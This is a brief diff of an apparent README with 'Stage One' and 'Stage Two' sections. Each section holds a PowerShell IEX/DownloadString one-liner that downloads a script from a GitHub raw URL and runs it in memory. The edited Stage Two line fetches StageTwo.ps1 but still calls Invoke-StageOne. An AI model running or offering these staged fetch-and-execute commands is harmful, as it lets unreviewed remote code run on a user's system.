@@ -15,6 +15,6 @@ IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com
 ~~~
 ## Stage Two
 ~~~
-IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/HeeresS/Small-Code/main/StageOne.ps1'); Invoke-StageOne
+IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/HeeresS/Small-Code/main/StageTwo.ps1'); Invoke-StageOne
 ~~~
 
